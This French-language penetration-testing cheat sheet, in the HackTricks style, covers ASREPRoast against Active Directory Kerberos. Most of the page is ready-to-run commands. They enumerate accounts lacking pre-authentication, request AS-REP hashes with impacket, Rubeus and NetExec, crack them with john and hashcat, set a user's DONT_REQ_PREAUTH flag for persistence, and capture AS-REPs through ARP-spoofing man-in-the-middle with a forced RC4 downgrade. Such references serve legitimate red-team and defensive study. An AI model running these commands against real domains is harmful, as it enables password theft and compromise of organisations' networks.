# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast est une attaque de sécurité qui exploite les utilisateurs qui n’ont pas l’attribut **Kerberos pre-authentication required**. En substance, cette vulnérabilité permet aux attaquants de demander l’authentification d’un utilisateur au Domain Controller (DC) sans avoir besoin du mot de passe de l’utilisateur. Le DC répond alors avec un message chiffré à l’aide de la clé dérivée du mot de passe de l’utilisateur, que les attaquants peuvent tenter de casser hors ligne pour découvrir le mot de passe de l’utilisateur.

Les principales conditions requises pour cette attaque sont :

- **Absence de Kerberos pre-authentication** : les utilisateurs cibles ne doivent pas avoir cette fonctionnalité de sécurité activée.
- **Connexion au Domain Controller (DC)** : les attaquants doivent avoir accès au DC pour envoyer des requêtes et recevoir des messages chiffrés.
- **Compte de domaine optionnel** : disposer d’un compte de domaine permet aux attaquants d’identifier plus efficacement les utilisateurs vulnérables via des requêtes LDAP. Sans un tel compte, les attaquants doivent deviner les noms d’utilisateur.

#### Énumération des utilisateurs vulnérables (besoin d’identifiants de domaine)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Demande message AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus requests **RC4** by default, so Event ID **4768** usually shows **preauth type 0** and **ticket encryption type 0x17**. If you add **`/aes`** (or RC4 is disabled for the target), expect **AES etypes** instead.

#### Quick one-liners (Linux)

- Énumérez d’abord les cibles potentielles (par exemple, à partir de chemins de build leakés) avec Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast une liste entière de usernames sans identifiants valides avec NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Si vous avez des creds, laissez NetExec interroger LDAP et demander chaque compte roastable pour vous: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Si la sortie commence par **`$krb5asrep$23$`**, crackez-la avec Hashcat **`-m 18200`**. Si elle commence par **`$krb5asrep$17$`** ou **`$krb5asrep$18$`**, privilégiez John **`--format=krb5asrep`**.

### Cracking

Ne supposez pas que chaque AS-REP roast utilise RC4. Les outils modernes peuvent renvoyer **RC4** (`$krb5asrep$23$`) ou **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) selon l'enctype demandé/négocié. **`hashcat -m 18200`** est pour **etype 23**, tandis que **John** gère `krb5asrep` directement pour **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistance

Forcer **preauth** non requis pour un utilisateur pour lequel vous avez des permissions **GenericAll** (ou des permissions d'écriture des propriétés) :
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sans credentials

Un attaquant peut utiliser une position de man-in-the-middle pour capturer des paquets AS-REP lorsqu'ils traversent le réseau sans dépendre de la désactivation de la pré-authentification Kerberos. Cela fonctionne donc pour tous les utilisateurs sur le VLAN.\
Si vous voulez la technique associée sans credentials qui renvoie un **service ticket** au lieu d'un **TGT** à partir d'un principal no-preauth, voir [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nous permet de faire cela. Le mode `relay` est le plus intéressant offensivement car il peut forcer **RC4** lorsque le client annonce encore **etype 23** ; `listen` reste passif et capture simplement ce que le client/DC a négocié.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
